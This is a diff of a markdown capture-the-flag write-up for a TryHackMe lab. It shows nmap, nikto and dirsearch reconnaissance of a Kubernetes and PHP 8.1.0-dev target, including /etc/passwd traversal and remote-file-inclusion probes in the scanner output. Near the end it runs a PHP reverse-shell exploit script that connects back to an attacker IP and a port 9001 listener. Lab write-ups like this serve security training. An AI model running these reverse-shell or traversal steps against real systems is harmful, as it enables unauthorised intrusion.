@@ -5,18 +5,6 @@
 Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<br>
 <img width="1200px" src=""></p>
 
-
-<p>Summary
-
-- Port Scanning → Service Discovery<br>
-- Web Vulberability Scanning<br>
-- Directory and File Enumeration<br>
-- Web Interface Inspection<br>
-- Weaponization<br>
-- Delivery and Execution<br>
-- Initial Foothold</p>
-
-
 <br>
 <br>
 <h1>Task 1 . You can do it!</h1>
@@ -35,13 +23,25 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 
 <br>
 <br>
+<h1 align="center">Summary</h1>
+<p>
+  
+- Port Scanning → Service Discovery<br>
+- Web Vulberability Scanning<br>
+- Directory and File Enumeration<br>
+- Web Interface Inspection<br>
+- Weaponization<br>
+- Delivery and Execution<br>
+- Initial Foothold</p>
+
+<br>
 <br>
 <h1 align="center">Port Scanning → Service Discovery</h1>
 <p align="center"><strong>8</strong> open ports</p>
 <br>
 
 ```bash
-:~# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.46.77 -oN full_scan.txt
+:~# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.80.52 -oN full_scan.txt
 ```
 
 <div align="center"><h6>
@@ -60,7 +60,132 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 </h6></div><br>
 
 ```bash
-:~# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.46.77 -oN full_scan.txt
+:~/FrankandHerbyTryAgain# nmap -p- -sS -sV -sC -T4 -Pn --open 10.201.80.52 -oN full_scan.txt
+...
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+| ssl-cert: Subject: commonName=microk8s@1647797913
+| Subject Alternative Name: DNS:microk8s
+| Not valid before: 2022-03-20T16:38:32
+|_Not valid after:  2023-03-20T16:38:32
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+10257/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 185
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
+|   HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 189
+|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
+| ssl-cert: Subject: commonName=localhost@1759688813
+| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
+| Not valid before: 2025-10-05T17:26:31
+|_Not valid after:  2026-10-05T17:26:31
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+10259/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 185
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
+|   HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     X-Content-Type-Options: nosniff
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 189
+|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
+| ssl-cert: Subject: commonName=localhost@1759688800
+| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
+| Not valid before: 2025-10-05T17:26:31
+|_Not valid after:  2026-10-05T17:26:31
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+16443/tcp open  ssl/unknown
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: 659c389e-6a4a-4843-830a-073c7e3f5d7f
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Sun, 05 Oct 2025 18:36:11 GMT
+|     Content-Length: 129
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: cacb6992-aa85-40d1-a22a-4111b51ffcc4
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 129
+|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+|   HTTPOptions: 
+|     HTTP/1.0 401 Unauthorized
+|     Audit-Id: 02986f30-4747-4dfe-8d46-4156a859718b
+|     Cache-Control: no-cache, private
+|     Content-Type: application/json
+|     Date: Sun, 05 Oct 2025 18:35:46 GMT
+|     Content-Length: 129
+|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
+| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.80.52
+| Not valid before: 2025-10-05T18:25:20
+|_Not valid after:  2026-10-05T18:25:20
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|_  http/1.1
+25000/tcp open  ssl/http    Gunicorn 19.7.1
+|_http-server-header: gunicorn/19.7.1
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
+| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.80.52
+| Not valid before: 2025-10-05T18:25:20
+|_Not valid after:  2026-10-05T18:25:20
+30679/tcp open  http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
+|_http-title: FRANK RULEZZ!
 ```
 
 <br>
@@ -81,191 +206,44 @@ Access it <a href="https://tryhackme.com/room/frankandherbytryagain">here</a>.<b
 
 </p></div><br>
 
-```bash
-:~# nmap -sT -p 22,3000,10250,10257,10259,16443,25000,31337,32000 -T4 10.201.46.77
-...
-PORT      STATE  SERVICE
-22/tcp    open   ssh
-3000/tcp  closed ppp
-10250/tcp open   unknown
-10257/tcp open   unknown
-10259/tcp open   unknown
-16443/tcp open   unknown
-25000/tcp open   icl-twobase1
-31337/tcp closed Elite
-32000/tcp closed unknown
-```
-
-```bash
-:~# nmap -T4 10.201.46.77 -p 25000-33000
-PORT      STATE SERVICE
-25000/tcp open  icl-twobase1
-30679/tcp open  unknown
-```
-
-```bash
-:~# nmap -sC -sV -Pn -p 30679 -T4 10.201.46.77
-...
-PORT      STATE SERVICE VERSION
-30679/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
-|_http-title: FRANK RULEZZ!
-```
-
-```bash
-:~# nmap -p 10000-32767 10.201.46.77
-...
-PORT      STATE SERVICE
-10250/tcp open  unknown
-10255/tcp open  unknown
-10257/tcp open  unknown
-10259/tcp open  unknown
-16443/tcp open  unknown
-25000/tcp open  icl-twobase1
-30679/tcp open  unknown
-```
-
-```bash
-:~# nmap -sC -sV -p 22,3000,10250,10255,10257,10259,16443,25000,30679 -T4 10.201.46.77
-...
-PORT      STATE  SERVICE     VERSION
-22/tcp    open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-3000/tcp  closed ppp
-10250/tcp open   ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-| ssl-cert: Subject: commonName=microk8s@1647797913
-| Subject Alternative Name: DNS:microk8s
-| Not valid before: 2022-03-20T16:38:32
-|_Not valid after:  2023-03-20T16:38:32
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|   h2
-|_  http/1.1
-10255/tcp open   http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
-|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
-10257/tcp open   ssl/unknown
-| fingerprint-strings: 
-|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 403 Forbidden
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 185
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
-|   HTTPOptions: 
-|     HTTP/1.0 403 Forbidden
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 189
-|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
-| ssl-cert: Subject: commonName=localhost@1759612053
-| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
-| Not valid before: 2025-10-04T20:07:29
-|_Not valid after:  2026-10-04T20:07:29
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|   h2
-|_  http/1.1
-10259/tcp open   ssl/unknown
-| fingerprint-strings: 
-|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 403 Forbidden
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 185
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
-|   HTTPOptions: 
-|     HTTP/1.0 403 Forbidden
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     X-Content-Type-Options: nosniff
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 189
-|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
-| ssl-cert: Subject: commonName=localhost@1759612058
-| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
-| Not valid before: 2025-10-04T20:07:29
-|_Not valid after:  2026-10-04T20:07:29
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|   h2
-|_  http/1.1
-16443/tcp open   ssl/unknown
-| fingerprint-strings: 
-|   FourOhFourRequest: 
-|     HTTP/1.0 401 Unauthorized
-|     Audit-Id: b0f7c360-85d3-4ed1-a7ee-f7cd3225f59a
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     Date: Sat, 04 Oct 2025 21:57:07 GMT
-|     Content-Length: 129
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
-|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 401 Unauthorized
-|     Audit-Id: 20349459-b606-4e6d-9833-1265e472c3e9
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 129
-|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
-|   HTTPOptions: 
-|     HTTP/1.0 401 Unauthorized
-|     Audit-Id: 67fba31f-3155-4d8d-9e49-96d2bb18835f
-|     Cache-Control: no-cache, private
-|     Content-Type: application/json
-|     Date: Sat, 04 Oct 2025 21:56:42 GMT
-|     Content-Length: 129
-|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
-| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
-| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.46.77
-| Not valid before: 2025-10-04T21:05:46
-|_Not valid after:  2026-10-04T21:05:46
-|_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|   h2
-|_  http/1.1
-25000/tcp open   ssl/http    Gunicorn 19.7.1
-|_http-server-header: gunicorn/19.7.1
-| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
-| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.201.46.77
-| Not valid before: 2025-10-04T21:05:46
-|_Not valid after:  2026-10-04T21:05:46
-30679/tcp open   http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
-|_http-title: FRANK RULEZZ!
-```
-
-<br>
 <br>
 <br>
 <h1 align="center">Web Vulberability Scanning</h1>
 <p align="center"><code>25000</code>code> and <code>30679</code>code>are the only ports confirmed to be running HTTP services with banners or headers that Nikto can analyze effectively.<br>Other ports are likely Kubernetes or API endpoints that Nikto is not optimized to scan.</p>
 
+<br>
+<div align="center"><h6>
+
+| **Discovery**                                               | **Details**                                                                                                                                  |
+|------------------------------------------------------------:|:---------------------------------------------------------------------------------------------------------------------------------------------|
+| `SSL Certificate Mismatch`<br><br>                          | - Hostname  does not match certificate CN <br>- May indicate misconfiguration or internal-only exposure.                                     |
+| `Missing Anti-Clickjacking Header`<br><br>                  | - X-Frame-Options header is not present<br>- Could allow clickjacking attacks if the app has sensitive UI components.                        |
+| `Gunicorn Server Detected`<br><br> 	                        | - erver identified as gunicorn/19.7.1<br>- Python-based WSGI server; may suggest Flask or Django backend.                                    |
+                            |
+</h6></div>  
+
 
 ```bash
-:~# nikto -h https://10.201.46.77:25000
-```
-
-```bash
-:~# nikto -h http://10.201.46.77:30679
+:~/FrankandHerbyTryAgain# nikto -h https://10.201.80.52:25000
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.201.80.52
++ Target Hostname:    10.201.80.52
++ Target Port:        25000
+---------------------------------------------------------------------------
++ SSL Info:        Subject: /C=GB/ST=Canonical/L=Canonical/O=Canonical/OU=Canonical/CN=127.0.0.1
+                   Ciphers: TLS_AES_256_GCM_SHA384
+                   Issuer:  /CN=10.152.183.1
++ Start Time:         2025-10-05 19:40:45 (GMT1)
+---------------------------------------------------------------------------
++ Server: gunicorn/19.7.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Hostname '10.201.80.52' does not match certificate's CN '127.0.0.1'
++ 6544 items checked: 0 error(s) and 2 item(s) reported on remote host
++ End Time:           2025-10-05 19:41:41 (GMT1) (56 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
 ```
 
 <br>
@@ -280,13 +258,13 @@ PORT      STATE  SERVICE     VERSION
 </h6></div>  
 
 ```bash
-:~# nikto -h 10.201.46.77:30679
+:~/FrankandHerbyTryAgain# nikto -h http://10.201.80.52:30679
 - Nikto v2.1.5
 ---------------------------------------------------------------------------
-+ Target IP:          10.201.46.77
-+ Target Hostname:    10.201.46.77
++ Target IP:          10.201.80.52
++ Target Hostname:    10.201.80.52
 + Target Port:        30679
-+ Start Time:         2025-10-04 22:34:40 (GMT1)
++ Start Time:         2025-10-05 19:42:19 (GMT1)
 ---------------------------------------------------------------------------
 + Server: No banner retrieved
 + Retrieved x-powered-by header: PHP/8.1.0-dev
@@ -302,80 +280,72 @@ PORT      STATE  SERVICE     VERSION
 + OSVDB-18114: /reports/rwservlet?server=repserv+report=/tmp/hacker.rdf+destype=cache+desformat=PDF:  Oracle Reports rwservlet report Variable Arbitrary Report Executable Execution
 + OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
 + 6544 items checked: 24 error(s) and 11 item(s) reported on remote host
-+ End Time:           2025-10-04 22:34:55 (GMT1) (15 seconds)
++ End Time:           2025-10-05 19:43:40 (GMT1) (81 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
 
 <br>
 <br>
-<br>
 <h1 align="center">Directory and File Enumeration</h1>
 
 ```bash
-dirsearch -u https://10.201.46.77:25000 -e php,html,txt,js,json -x 403,404,500 -k
-```
-
-```bash
-dirsearch -u http://10.201.46.77:30679 -e php,html,txt,js,json -x 403,404,500
-```
-
-
-```bash
-root@ip-10-201-105-176:~# dirsearch -u https://10.201.46.77:10250/
+:~/FrankandHerbyTryAgain# dirsearch -u https://10.201.80.52:10250/
 
   _|. _ _  _  _  _ _|_    v0.4.3.post1
  (_||| _) (/_(_|| (_| )
 
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
 
-Output File: /root/reports/https_10.201.46.77_10250/__25-10-04_22-23-11.txt
+Output File: /root/FrankandHerbyTryAgain/reports/https_10.201.80.52_10250/__25-10-05_20-00-02.txt
 
-Target: https://10.201.46.77:10250/
+Target: https://10.201.80.52:10250/
 
-[22:23:11] Starting: 
-[22:23:12] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
-[22:23:12] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
-[22:23:40] 401 -   12B  - /attach
-[22:23:41] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
-[22:23:41] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
-[22:23:41] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
-[22:23:45] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
-[22:23:46] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
-[22:23:53] 401 -   12B  - /debug/pprof/goroutine?debug=1
-[22:23:53] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
-[22:23:53] 401 -   12B  - /debug/pprof/heap
-[22:23:53] 401 -   12B  - /debug/pprof/trace
-[22:23:53] 401 -   12B  - /debug/pprof/
-[22:23:53] 401 -   12B  - /debug/pprof/profile
-[22:23:56] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
-[22:23:56] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
-[22:23:58] 401 -   12B  - /exec
-[22:23:58] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
-[22:24:03] 401 -   12B  - /healthz
-[22:24:04] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
-[22:24:14] 401 -   12B  - /logs/access.log
-[22:24:14] 301 -   41B  - /logs  ->  /logs/
-[22:24:15] 401 -   12B  - /logs/error_log
-[22:24:15] 401 -   12B  - /logs/mail.log
-[22:24:15] 401 -   12B  - /logs/access_log
-[22:24:15] 401 -   12B  - /logs/proxy_access_ssl_log
-[22:24:15] 401 -   12B  - /logs/
-[22:24:15] 401 -   12B  - /logs/liferay.log
-[22:24:14] 401 -   12B  - /logs/error.log
-[22:24:15] 401 -   12B  - /logs/wsadmin.traceout
-[22:24:15] 401 -   12B  - /logs/proxy_error_log
-[22:24:15] 401 -   12B  - /logs/www-error.log
-[22:24:15] 401 -   12B  - /logs/errors.log
-[22:24:18] 401 -   12B  - /metrics
-[22:24:36] 401 -   12B  - /pods
-[22:24:43] 401 -   12B  - /run
-[22:24:53] 401 -   12B  - /stats/
-[22:24:53] 301 -   42B  - /stats  ->  /stats/
+[20:00:02] Starting: 
+[20:00:03] 301 -   46B  - /%2e%2e//google.com  ->  /google.com
+[20:00:03] 301 -   46B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
+[20:00:28] 401 -   12B  - /attach
+[20:00:29] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
+[20:00:29] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
+[20:00:29] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
+[20:00:32] 301 -   46B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
+[20:00:33] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
+[20:00:39] 301 -   48B  - /debug/pprof  ->  /debug/pprof/
+[20:00:39] 401 -   12B  - /debug/pprof/
+[20:00:39] 401 -   12B  - /debug/pprof/profile
+[20:00:39] 401 -   12B  - /debug/pprof/goroutine?debug=1
+[20:00:39] 401 -   12B  - /debug/pprof/heap
+[20:00:39] 401 -   12B  - /debug/pprof/trace
+[20:00:42] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
+[20:00:42] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
+[20:00:44] 401 -   12B  - /exec
+[20:00:44] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
+[20:00:48] 401 -   12B  - /healthz
+[20:00:49] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
+[20:00:58] 401 -   12B  - /logs/access_log
+[20:00:58] 401 -   12B  - /logs/proxy_access_ssl_log
+[20:00:58] 301 -   41B  - /logs  ->  /logs/
+[20:00:58] 401 -   12B  - /logs/errors.log
+[20:00:58] 401 -   12B  - /logs/error_log
+[20:00:58] 401 -   12B  - /logs/liferay.log
+[20:00:58] 401 -   12B  - /logs/www-error.log
+[20:00:58] 401 -   12B  - /logs/access.log
+[20:00:58] 401 -   12B  - /logs/mail.log
+[20:00:58] 401 -   12B  - /logs/
+[20:00:58] 401 -   12B  - /logs/wsadmin.traceout
+[20:00:58] 401 -   12B  - /logs/error.log
+[20:00:58] 401 -   12B  - /logs/proxy_error_log
+[20:01:01] 401 -   12B  - /metrics
+[20:01:13] 401 -   12B  - /pods
+[20:01:19] 401 -   12B  - /run
+[20:01:27] 301 -   42B  - /stats  ->  /stats/
+[20:01:27] 401 -   12B  - /stats/
 
 Task Completed
 ```
 
+<br>
+<br>
 <h1 align="center">Web Interface Inspection</h1>
 <h2 align="center">25000</h2>
 
@@ -437,6 +407,8 @@ Listening on 0.0.0.0 9001
 python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <Attack_Port>
 ```
 
+<br>
+<br>
 <h1 align="center">Delivery and Execution</h1>
 <p align="center">Exploit execution</p>
 
@@ -444,6 +416,8 @@ python3 revshell_php_8.1.0-dev.py http://<Target_IP>:<Target_Port> <Attack_IP> <
 :~# python3 revshell_php_8.1.0-dev.py http://10.201.49.183:30679 10.201.39.157 9001
 ```
 
+<br>
+<br>
 <h1 align="center">Initial Foothold</h1>
 
 ```bash
